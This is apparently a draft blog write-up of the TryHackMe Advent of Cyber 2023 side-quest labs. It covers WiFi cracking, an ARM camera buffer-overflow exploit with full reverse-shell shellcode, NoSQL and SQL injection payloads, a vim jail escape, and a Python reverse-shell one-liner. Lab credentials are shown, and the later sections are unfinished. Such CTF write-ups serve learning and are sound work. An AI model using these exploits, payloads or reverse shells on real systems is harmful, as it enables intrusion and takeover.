---
title: Advent Of Cyber 2023 Sidequests
date: 2023-12-25
tags:
  - cybersecurity
  - ctf
  - writeup
  - TryHackMe
  - wireshark
  - bof
  - containers
draft: true
---
The TryHackMe platform organized the Advent Of Cyber ​​2023 event, which was a set of basic cybersecurity challenges. In parallel, it organized four events of a higher difficulty, which were hidden within the main event. 
This is the first cybersecurity event in which I have participated, so it is with great enthusiasm that I leave you the route that I followed to solve each test.


# SQ1: The Return of the Yeti
https://tryhackme.com/room/adv3nt0fdbopsjcap

## Room discovery
The link to this room was hidden on TryHackMe's social networks, and to enter you had to look for the four images corresponding to the four fragments of the QR code.

## Package analysis
This wasn't a machine but a `.pcapng` file (a network packet capture) that we have to analyze with wireshark in order to answer five questions.

##### **Question 1**: *What's the name of the WiFi network in the PCAP?*
This question is easy. Download `VanSpy.pcapng.zip`, extract it and open it with `wireshark`, just by reading you will find it is **FreeWifiBFC**, but you can also apply the filter `wlan.ssid`

##### **Question 2**: *What's the password to access the WiFi network?* 
This can be solved using `aircrack` (if the password is weak, which it is), but you will need an extra step:
1. Convert `.pcapng` to `.pcap`: `tshark -F pcap -r VanSpy.pcapng -w VanSpy.pcap`
2. Crack it! `aircrack-ng VanSpy.pcap -w /root/SecLists/rockyou.txt` (password: `Christmas`)

##### **Question 3**: *What suspicious tool is used by the attacker to extract a juicy file from the server?*
With the decrypted 802.11 traffic you can search for tcp packets. On wireshark, go to `Edit > Preferences > Protocols > IEEE 802.11`.
![decrypted 802.11 traffic with wireshark](_assets/aoc23_wireshark1.png)

If you follow TCP Stream, the last that the attacker did was connecting to a windows machine, and using `mimikatz` to extract a `.pfx` file with the `rsa` key, which you will need to decrypt the TLS traffic.
![mimikatz wireshark](_assets/aoc23_wireshark2%20-%20mimikatz.png)

##### **Question 4**: *What is the case number assigned by the CyberPolice to the issues reported by McSkidy?*: `31337-0`
1. Decode the pfx file copied from wireshark: `cat certificate-base64.pfx | base64 -d > certificate.pfx`
2. Extract it with the right password (clue: don't need to bruteforce it, since it was extracted with `mimikatz` that's the default password): `openssl pkcs12 -in certificate.pfx -out keyfile.key -nodes`
  - In case you would like to try bruteforce, in another situation, tou can use `pfx2john` to create a hash.
3. Edit the key and import it to wireshark > preferences > rsa to decrypt the tls traffic. What you are looking for is text that has been copied through RDP clipboard. Wireshark captures that traffic as protocol *CLIPRDR*, if you filter by `rdp_cliprdr` and try to read those packets you will find it. The "Decrypted TLS" looks like that: `...3.1.3.3.7.-.0...`
  - Also some people did use `pyrdp`\*

##### **Question 5**, *What is the content of the yetikey1.txt file?*
This question can be answered by simply reading the decrypted TLS traffic as before (notice that on wireshark you were reading an extra `.` between characters), and you will recognize which is it because previously you will read `yetikey1.txt`.
`1-1f9548f131522e85ea30e801dfd9b1a4e526003f9e83301faad85e6154ef2834`

\* Additionaly, some people did use [`pyrdp`]() to convert the rdp session to a mp4 file, which it's a more elegant way of doing it:
1. Load the rsa key to decrypt the tls traffic
2. Export the rdp session
```bash
pip install pyrdp-mitm[full]
pyrdp-convert -o . -f mp4 sq1-rdp.pcap
```


---
# SQ2: Snowy ARMageddon
https://tryhackme.com/room/armageddon2r

The second room is a Linux machine cataloged as "insane".
First we will gain access to the room through a QR code that we will obtain by exploiting a simple buffer overflow in a pixel game. Secondly we will use a payload written in python and arm assembly for creating a reverse shell. Finally we will do a NOSQL injection for getting the credentials form MongoDB.


## Pixel Game - Memory Corruption

The URL for the room was hidden in the task from the **day 6** from the [main event of Advent Of Cyber](https://tryhackme.com/room/adventofcyber2023).
It was a pixel game where you have to exploit a simple buffer overflow.

It is a game in which the main character can interact with a computer to obtain up to 16 coins, which he can use to change his name or buy items in a store.
We can see how the game memory is distributed, where 12 bytes are designated to store the name variable. However, if we enter a longer name, the additional bytes go to occupy the next variable, which in this case are the game coins.

![[_assets/aoc23_game_memory.png| Game Memory |300]]

We also can buy items on the shop, but we notice there's a missing one corresponding to letter `a`, and if we try to buy it, the shopper tell us that we don't have enough coins.

We can try to get a large amount of coins by modifying the memory of the game. For doing so we can use the ASCII to hex table, and also a decimal to hex [online converter](https://www.rapidtables.com/convert/number/hex-to-decimal.html) .

![[_assets/aoc23_ASCII_table.png|400]]

As we can see in the table, the symbol `~` corresponds to the maximum hexadecimal value that we can type, so we enter 12 random characters for the name and 4 additional bytes that will overwrite the value of coins on the memory. By entering the name `aaaabbbbcccc~~~~` we get `2122219134` coins.

![[_assets/aoc23_memory_corruption_1.gif| Memory Corruption (1) |400]]

Now we can successfully buy the item "a", which is a token of Yeti, and suddenly a "spirit" called G.O.C.P appears:
> *According to the legend, a **cat named Snowball** will arrive at this place one day. He will meet **Midas the greedy merchant**, and **Ted the name switcher**. He'll bring **exactly 31337 coins** and the **token of the Yeti**. When all these conditions are met, input the **30 lives secret code** and what's hidden shall be revealed.*

The inventory should look like this:

```
player_name  S n o w
             b a l l
             ∅ ∅ ∅ ∅
      coins  i z ∅ ∅  # 31337
 shopk_name  M i d a
             s ∅ ∅ ∅
             ∅ ∅ ∅ ∅
 namer_name  T e d ∅
             ∅ ∅ ∅ ∅
             ∅ ∅ ∅ ∅
   inv_items 1 ∅ ∅ ∅
             ∅ ∅ ∅ ∅
             ∅ ∅ ∅ ∅
             ∅ ∅ ∅ ∅
```

Notice how the game adds a NULL character (`∅`) after your bytes, and it really doesn't matter what's next. Also notice the decimal value 31337 in hex is `7A 69` but because it is stored in little endian it should be `69 7A`, corresponding to `z i` in ASCII.
1. Remove the christmas ball from inventory: `aaaaaaaaaaaabbbbccccccccccccddddddddddddeeeef` & `aaaaaaaaaaaabbbbccccccccccccddddddddddddeeee`
2. Get enough coins to buy the yeti token: `~~~~~~~~~~~~~~~~` (`~`x16)
3. Rename the namer: `aaaaaaaaaaaabbbbccccccccccccTed`
4. Rename the shopk:  `aaaaaaaaaaaabbbbMidas`
5. Set 31337 + 8 coins = `71 7A` = `q z`: `,...,...,...qzz` and again `,...,...,...qz`
6. Rename player (expend 8 coins): `Snowball`
   
The [Konami Code](https://en.wikipedia.org/wiki/Konami_Code), also commonly referred to as the Contra Code and sometimes the **30 Lives code**: `↑↑↓↓←→←→BA`

![[_assets/aoc23_memory_corruption_2.gif| Memory Corruption (2)|400]]

---

## ARM Camera - Assembly

### nmap

We start scanning all ports from the machine with `nmap`:
```bash
nmap -Pn -n -sS --min-rate=5000 -p- $IP -oN allPorts -vv
```

```txt file:"" {1}
PORT      STATE SERVICE
22/tcp    open  ssh
23/tcp    open  telnet
8080/tcp  open  http-proxy
50628/tcp open  unknown
```

And we try to get more information about the ones that are open by running the default nmap scripts and also the version of that services (`-sCV` on target ports):
```bash
nmap -Pn -n -sS --min-rate=5000 -sCV -p 22,23,8080,50628 $IP -oN targetPorts -vv
```

### Port 50628 – Camera ARM

At port 50628 there is a web app, which emulates an ARM camera.

![[_assets/aoc23_camera_50628.png| Camera at port 50628 |350]]

A deep search on the [internet](https://armx.exploitlab.net/docs/debugging-with-armx.html) reveals it is part of the [EMUX (formerly ARMX) Firmware Emulation Framework](https://armx.exploitlab.net/). The source code of the docker container can be found on [GitHub](https://github.com/therealsaumil/armx).

#### ARM Exploit
Exploit: https://no-sec.net/arm-x-challenge-breaking-the-webs/
Compiler: https://cpulator.01xz.net/?sys=arm

> Stack overflow can be triggered by providing a long string value for the “basic” GET parameter.

```py
from pwn import *
 
HOST = '192.168.100.2'
PORT = 50628
 
buffer = cyclic(1000)
s = remote('192.168.100.2', 50628)
s.send(b'GET /en/login.asp?basic=' + buffer + b' HTTP/1.0\r\n\r\n')
s.close
```

> Reverse Shell written in assembly for the ARM camera

```asm file:"arm camera reverse shell" {21-27}
.section .text
.global _start  
_start:
    /* Move stack pointer above overwritten saved LR */
    sub sp, #16
    /* BINSH */
    mov r1, #0x68
    lsl r1, #8
    add r1, #0x73
    lsl r1, #8
    add r1, #0x2f
    push {r1}       // /sh
    mov r1, #0x6e
    lsl r1, #8
    add r1, #0x69
    lsl r1, #8
    add r1, #0x62
    lsl r1, #8
    add r1, #0x2f
    push {r1}       // /bin
    /* ADDR */
    mov r1, #0x164
    lsl r1, #8
    add r1, #0xa8
    lsl r1, #8
    add r1, #0xc0
    push {r1}       // 192.168.100.1
    mov r1, #0x5c
    lsl r1, #8
    add r1, #0x11
    lsl r1, #16
    add r1, #0x02
    push {r1}       // 4444; AF_INET, SOCK_STREAM
    /* execve */
    mov r3, #0xef
    lsl r3, #24
    push {r3}       // svc  #0
    /* ... */
    mov r1, #0xe3
    lsl r1, #8
    add r1, #0xa0
    lsl r1, #8
    add r1, #0x10
    lsl r1, #8
    add r1, #0x01
    push {r1}       // mov  r1, #1
    /* jump to shellcode */
    bx sp
```

> By compiling the assembly code, one can extract the according shellcode and place it inside e.g. a Python script for gaining a reverse root shell

```python file:"exploit.py" {27}
from pwn import *
   
HOST = '192.168.100.2'
PORT = 50628
LHOST = [192,168,100,1]
LPORT = 4444
 
BADCHARS = b'\x00\x09\x0a\x0d\x20\x23\x26'
BAD = False
LIBC_OFFSET = 0x40021000
LIBGCC_OFFSET = 0x4000e000
RETURN = LIBGCC_OFFSET + 0x2f88    # libgcc_s.so.1: bx sp   0x40010f88
SLEEP = LIBC_OFFSET + 0xdc54       # sleep@libc 0x4002ec54
 
pc = cyclic_find(0x63616176)  # 284
r4 = cyclic_find(0x6361616f)  # 256
r5 = cyclic_find(0x63616170)  # 260
r6 = cyclic_find(0x63616171)  # 264
r7 = cyclic_find(0x63616172)  # 268
r8 = cyclic_find(0x63616173)  # 272
r9 = cyclic_find(0x63616174)  # 276
r10 = cyclic_find(0x63616175) # 280
sp = cyclic_find(0x63616177)  # 288
 
SC  = b'\x10\xd0\x4d\xe2'     # sub sp, 16
SC += b'\x68\x10\xa0\xe3\x01\x14\xa0\xe1\x73\x10\x81\xe2\x01\x14\xa0\xe1\x2f\x10\x81\xe2\x04\x10\x2d\xe5\x6e\x10\xa0\xe3\x01\x14\xa0\xe1\x69\x10\x81\xe2\x01\x14\xa0\xe1\x62\x10\x81\xe2\x01\x14\xa0\xe1\x2f\x10\x81\xe2\x04\x10\x2d\xe5'      # /bin/sh
SC += b'\x59\x1f\xa0\xe3\x01\x14\xa0\xe1\xa8\x10\x81\xe2\x01\x14\xa0\xe1\xc0\x10\x81\xe2\x04\x10\x2d\xe5'   # 192.168.100.1
SC += b'\x5c\x10\xa0\xe3\x01\x14\xa0\xe1\x11\x10\x81\xe2\x01\x18\xa0\xe1\x02\x10\x81\xe2\x04\x10\x2d\xe5'   # 4444; AF_INET, SOCK_STREAM
SC += b'\xef\x30\xa0\xe3\x03\x3c\xa0\xe1\x04\x30\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\x0b\x10\x81\xe2\x04\x10\x2d\xe5\xe1\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x0c\x10\x81\xe2\x01\x10\x81\xe2\x04\x10\x2d\xe5\xe9\x10\xa0\xe3\x01\x14\xa0\xe1\x2d\x10\x81\xe2\x01\x18\xa0\xe1\x05\x10\x81\xe2\x04\x10\x2d\xe5\xe0\x10\xa0\xe3\x01\x14\xa0\xe1\x22\x10\x81\xe2\x01\x14\xa0\xe1\x1f\x10\x81\xe2\x01\x10\x81\xe2\x01\x14\xa0\xe1\x02\x10\x81\xe2\x04\x10\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x8f\x10\x81\xe2\x01\x18\xa0\xe1\x18\x10\x81\xe2\x04\x10\x2d\xe5'   # execve()
SC += b'\x04\x30\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x02\x10\x81\xe2\x04\x10\x2d\xe5\xe1\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x18\xa0\xe1\x0b\x10\x81\xe2\x04\x10\x2d\xe5'   # dup2(STDERR)
SC += b'\x04\x30\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x01\x10\x81\xe2\x04\x10\x2d\xe5\xe1\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x18\xa0\xe1\x0b\x10\x81\xe2\x04\x10\x2d\xe5'   # dub2(STDOUT)
SC += b'\x04\x30\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x87\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\x0e\x10\x81\xe2\x04\x10\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\x31\x10\x81\xe2\x04\x10\x2d\xe5\xe0\x10\xa0\xe3\x01\x14\xa0\xe1\x21\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x01\x10\x81\xe2\x04\x10\x2d\xe5\xe1\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x18\xa0\xe1\x0b\x10\x81\xe2\x04\x10\x2d\xe5'   # dup2(STDIN)
SC += b'\x04\x30\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x87\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\x1c\x10\x81\xe2\x04\x10\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\xff\x10\x81\xe2\x04\x10\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x1f\x10\x81\xe2\x01\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x04\x10\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x8f\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x50\x10\x81\xe2\x04\x10\x2d\xe5\xe1\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\xb0\x10\x81\xe2\x01\x14\xa0\xe1\x04\x10\x2d\xe5'   # connect()
SC += b'\x04\x30\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x87\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\x1a\x10\x81\xe2\x04\x10\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\xff\x10\x81\xe2\x04\x10\x2d\xe5\xe0\x10\xa0\xe3\x01\x14\xa0\xe1\x22\x10\x81\xe2\x01\x14\xa0\xe1\x1f\x10\x81\xe2\x01\x10\x81\xe2\x01\x14\xa0\xe1\x02\x10\x81\xe2\x04\x10\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x81\x10\x81\xe2\x01\x18\xa0\xe1\x01\x10\x81\xe2\x04\x10\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x01\x10\x81\xe2\x04\x10\x2d\xe5'   # socket()
#SC += b'\x01\x0c\xa0\xe3'   # mov r0, #256  ; sleep for 256s to avoid cache coherency issues
#SC += b'\x3a\xff\x2f\xe1'   # blx r10       ; r10 contains address of sleep@libc
SC += b'\x1d\xff\x2f\xe1'   # bx sp
 
info('Shellcode length: %d' % len(SC))
for i in range(len(SC)):
  if SC[i] in BADCHARS:
    print('BAD CHARACTER in position: %d!')
    BAD = True
if BAD:
  exit(1)
 
buffer  = b'A' * r10
buffer += p32(SLEEP)    # overwrite r10 with address of sleep()
buffer += p32(RETURN)   # bx sp
buffer += SC
 
s = remote('192.168.100.2', 50628)
s.send(b'GET /en/login.asp?basic=' + buffer + b' HTTP/1.0\r\n\r\n')
 
nc = listen(LPORT)
nc.wait_for_connection()
nc.interactive()
s.close()
nc.close()
```

The problem here is that we need to adjust the script so it matches our local IP address, and it has to be written in assembly too, so even we have taken a script we have to write a bit of assembly in order to make it work.

##### Writing Assembly code

For the default IP: `192.168.100.1` (dec) `c0.a8.64.01` (hex), the assembly code is the following:

```asm
mov r1, #0x164        // 59 1F A0 E3
lsl r1, r1, #8        // 01 14 A0 E1
add r1, r1, #0xa8     // A8 10 81 E2
lsl r1, r1, #8        // 01 14 A0 E1
add r1, r1, #0xc0     // C0 10 81 E2
str r1, [sp, #-4]!    // 04 10 2D E5
```

Which corresponds with this line of code from the python reverse shell script:

```python
#SC += b'\x59\x1f\xa0\xe3\x01\x14\xa0\xe1\xa8\x10\x81\xe2\x01\x14\xa0\xe1\xc0\x10\x81\xe2\x04\x10\x2d\xe5'   # 192.168.100.1
SC += b'\x59\x1f\xa0\xe3'
SC += b'\x01\x14\xa0\xe1'
SC += b'\xa8\x10\x81\xe2'
SC += b'\x01\x14\xa0\xe1'
SC += b'\xc0\x10\x81\xe2'
SC += b'\x04\x10\x2d\xe5'
```

We only need to change the IP address from the exploit to our THM IP, in my case `10.9.129.243` which is `0a.09.81.f3` in hexadecimal.

```python
SC += b'\xf3\x10\xa0\xe3'    # mov r1, #243
SC += b'\x01\x14\xa0\xe1'    # lsl r1, #8
SC += b'\x81\x10\x81\xe2'    # add r1, #129
SC += b'\x01\x14\xa0\xe1'    # lsl r1, #8
SC += b'\x08\x10\x81\xe2'    # add r1, #0x08
SC += b'\x01\x10\x81\xe2'    # add r1, #0x01    //(1+8)
SC += b'\x01\x14\xa0\xe1'    # lsl r1, #8
SC += b'\x08\x10\x81\xe2'    # add r1, #0x08
SC += b'\x02\x10\x81\xe2'    # add r1, #0x02    //(2+8, 10 is bad char)
SC += b'\x04\x10\x2d\xe5'    # push {r1}
```

> [!info] Even you can write the IP address in decimal, if you write it in hexadecimal you can be able to detect if there are any bad chars before compiling the assembly.

Here we have been using an already tested script, since we haven't had to write it by ourselves.
I really recommend the [[https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-linux-x86 | Stack-Based Buffer Overflows on Linux x86]] module from HackTheBox Academy (which is free), because it gives you a better understanding of this kind of vulnerabilities.
In summary, the person who wrote the exploit first had to identify the bad characters (which usually cut the character row on stack) by consecutively crafting a buffer with 284 `A`’s (in order to trigger a crash) and append the bytes `0x01` to `0xff` to it.
> Checking the stack values, once the crash occurs, the following bad characters can be found: `0x00 0x09 0x0a 0x0d 0x20 0x23 0x26`.

So that's why when I should have to write `10`and a `9` for my IP, I had to do it by adding two values to the stack, since `0a` and `09` are "bad characters".

##### Generating the optcode
The `Optcode` that is written on the python exploit can be obtained using an [[https://cpulator.01xz.net/?sys=arm | online compiler]], but after reading other people's writeups I discovered [[https://shell-storm.org/online/Online-Assembler-and-Disassembler/ | this great website]] which is written in python.

###### \[Optional \]: Locally compiling assembly
I would like to know how to do the assembly part without the online tool, so I created a docker container and runned the following commands:
```bash file:"arm compilation"
# 1) Install the compiler
apt update && apt install -y gcc-arm-none-eabi
# 2) The file we want to assemble
cat << EOF > ip.s
mov r1, #0x164        // 59 1F A0 E3
lsl r1, r1, #8        // 01 14 A0 E1
add r1, r1, #0xa8     // A8 10 81 E2
lsl r1, r1, #8        // 01 14 A0 E1
add r1, r1, #0xc0     // C0 10 81 E2
str r1, [sp, #-4]!    // 04 10 2D E5
EOF
# 3) assemble
arm-none-eabi-as -mfloat-abi=soft -march=armv7-a -mcpu=cortex-a9 -mfpu=neon-fp16 -g ip.s -o ip.o
# 4) disassemble
arm-none-eabi-objdump -d ip.o

ip.o:     file format elf32-littlearm


Disassembly of section .text:

00000000 <.text>:
   0:   e3a01f59        mov     r1, #356        @ 0x164
   4:   e1a01401        lsl     r1, r1, #8
   8:   e28110a8        add     r1, r1, #168    @ 0xa8
   c:   e1a01401        lsl     r1, r1, #8
  10:   e28110c0        add     r1, r1, #192    @ 0xc0
  14:   e52d1004        push    {r1}            @ (str r1, [sp, #-4]!)
```

From here we must understand it is little endian, so our optcode corresponds to the second column but read backwards and since it's hexadecimal taking the numbers in pairs (eg. starting with `59 1f a0 e3` and so on).

```python
#!/usr/bin/env python
# pip install keystone-engine
import sys
from keystone import Ks, KS_ARCH_ARM, KS_MODE_ARM

def getOptCode(arch, mode, code, syntax=0):
    optCode = ''
    ks = Ks(arch, mode)
    if syntax != 0:
        ks.syntax = syntax
    encoding, count = ks.asm(code)
    for i in encoding:
        print("%02x " % i, end='')
        optCode += "\\x{:02x}".format(i)
    print("\t", end='')
    print(" %s" % code.decode('utf-8'))
    return optCode

with open(sys.argv[1], 'r') as f:
    file = f.readlines()
    finalOptCode = ''
    for line in file:
        line = line.strip('\n').encode('utf-8')
        finalOptCode += getOptCode(KS_ARCH_ARM, KS_MODE_ARM, line)
    print(f"\nSC += b\'{finalOptCode}\'")
```

---
Inside the machine, as we already knew, we are not in a real arm camera system but inside a container which is emulating this (`/.emux`). We can find some credentials: 
```sh
$ cat /.emux/.nfs00000000000fb07f00000001
#!/bin/sh
rm -f /dev/abs628
touch /dev/abs628
/etc/init.d/rc.sysinit
sed -i 's/password=admin/password=Y3tiStarCur!ous&/' /var/etc/umconfig.txt
/etc/init.d/rc 3
/bin/sh

$ cd /var/etc                                           
$ grep -i pass . -r
./umconfig.txt:password=Y3tiStarCur!ouspassword=admin
```

Now if we go back to the website at `$IP:50628` we can log in with username=`admin` and password=`Y3tiStarCur!ouspassword=admin`.
**Flag 1**: `THM{YETI_ON_SCREEN_ELUSIVE_CAMERA_STAR}`
We still need to find the yetikey2.
### Enabling telnet connection (optional)
Once you are in the camera, run `telnetd` and in another shell connect to telnet `telnet $IP 23` with credentials `root:Y3tiStarCur!ous&`

### Accessing port 8080 **locally**
Because *"Access is strictly forbidden for non-elves"*

```bash
curl -u user:pass IP:PORT
curl -u 'admin:Y3tiStarCur!ouspassword=admin' 10.10.26.166:8080
```

## MongoDB - NoSQLi
### Port 8080

There's a login form at `http://$IP:8080/login.php/` (notice the final slash `/`)
- `/.DS_Store` hints it's a NOSQL database
- Review NoSQLi: [THM - NoSQL injection Basics](https://tryhackme.com/room/nosqlinjectiontutorial)
- NoSQL enumeration: https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration
      
	```shell file:"NOSQL users enumeration"
	python3 nosqli-user-pass-enum.py -u http://$IP:8080/login.php/ -up username -pp password -ep username -op login:login,submit:submit -m POST
	
	7 username(s) found:
	Blizzardson
	Frostbite
	Grinchowski
	Iciclevich
	Northpolinsky
	Scroogestein
	Tinselova
	```
      
	```shell file:"NOSQL passwords enumeration"
	python3 nosqli-user-pass-enum.py -u http://$IP:8080/login.php/ -up username -pp password -ep password -op login:login,submit:submit -m POST
	
	6Ne2HYXUovEIVOEQg2US
	7yIcnHu8HC6QCH1MCfHS
	advEpXUBKt3bZjk3aHLR
	h1y6zpVTOwGYoB95aRnk
	jlXUuZKIeCONQQIe92GZ
	rCwBuLJPNzmRGExQucTC
	tANd8qZ93sFHUBrJhdQj
	uwx395sm4GpVfqQ4dUDI
	E33v0lTuUVa1ct4sSed1
	F6Ymdyzx9C1QeNOcU7FD
	HoHoHacked
	JZwpMOTmDvVYDq3uSb3t
	NlJt6HBZBG3olEphq8gr
	ROpPXouppjXNf2pmmT0Q
	UZbIt6L41BmLeQJF0gAR
	WmLP5OZDiLos16Ie1owB
	```

---
# SQ3: Frosteau Busy with Vim
https://tryhackme.com/jr/busyvimfrosteau

## Nmap

```shell
nmap -Pn -n -sS --min-rate=5000 -p- $IP -oN allPorts -vv
nmap -Pn -n -sCV -p 22,80,8065,8075,8085,8095 $IP -oN targetPorts
```
After running `nmap` we can get this information about the open ports:
- 22 (ssh) -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
- 80 (http) -> WebSockify Python/3.8.10
- 8065 (telnet)
- 8075 (ftp) -> BusyBox ftpd (D-Link DCS-932L IP-Cam camera); anonymous FTP login allowed
- 8085 (telnet) -> vim
- 8095 (telnet) -> nano

`telnet $IP 8065` is interesting because it doesn't give you a direct shell but you are inside the `vim` editor, which can be used to run commands, however, you can't get a direct shell with ~~`:!/bin/sh`~~.
## Jailbreak 

This is the procedure that I followed in order to get a shell:
```
# ftp (at /tmp/ftp)
put localFilePath remoteFileName
# with vim u rename it (move it)
# new file
:open("your_file_path_here", 'w').close()
# new dir
:python3 import os; os.makedirs("/tmp/bin")
# chmod
:python3 import os; os.chmod("/tmp/sh", 0o777)
# add to path
PATH=/tmp/bin:$PATH
```

1. `ftp $IP 8075` lets you to log in as `anonymous`. The directory where you have access is located at `/tmp/ftp`, and you can go there using vim (`telnet $IP 8065`) and typing `:e /tmp/ftp`.
2. I am using Debian and the machine is running Ubuntu (based on Debian), so I uploaded `bash` from my local machine (you can also download it from [[pkgs.org]]). From ftp, I simply run `put /bin/bash bash` and then I tried to execute it with vim, but the uploaded binary didn't have execution permissions. The solution that I found was using python commands,
```
# at 8087
put /usr/bin/chmod chmod
# at 8085
:e /tmp/ftp
R
Moving /tmp/ftp/chmod to : /tmp/bin/chmod
:python3 import os; os.chmod("/tmp/bin/chmod", 0o777)
# at 8065
PATH=/tmp/bin:$PATH
```

`chw00t -3 --dir /proc/1`


---
# [SQ4: ](https://tryhackme.com/room/surfingyetiiscomingtotown)

## Nmap 
- 22 (ssh)
- 8000 (http)

## Website at 8000
directory scan (gobuster)
- `/download`
- `/console`

### `/download`
Says to click images to download 3 svg files.
Burpsuite detects sqli at `http://$IP:8000/download?id=2'`
```python
# File "/home/mcskidy/app/app.py", line 28, in download
    file_id = request.args.get('id','')
    if file_id!='':
        cur = mysql.connection.cursor()
        query = "SELECT url FROM elves where url_id = '%s'" % (file_id)
        cur.execute(query)
        results = cur.fetchall()
        for url in results:
            filename = url[0]
            response_buf = BytesIO()
```

So the query executed is `SELECT url FROM elves where url_id = '%s'`

`http://$IP:8000/download?id=11'+UNION+SELECT+'file://///sys/class/net/eth0/address';--`

`http://$IP:8000/download?id=11'+UNION+SELECT+'file://///etc/machine-id';--`


get shell

```bash
# host
nc -lnv 10.9.129.243 4444
# target
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.129.243",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
```

```bash
git show e9855c8a10cb97c287759f498c3314912b7f4713

 # MySQL configuration
 app.config['MYSQL_HOST'] = 'localhost'
-app.config['MYSQL_USER'] = 'root'
-app.config['MYSQL_PASSWORD'] = 'w6UV3tjxAuKCUWtP'
+app.config['MYSQL_USER'] = 'mcskidy'
+app.config['MYSQL_PASSWORD'] = 'F453TgvhALjZ'
 app.config['MYSQL_DB'] = 'elfimages'
 mysql = MySQL(app)

```


### `/console`
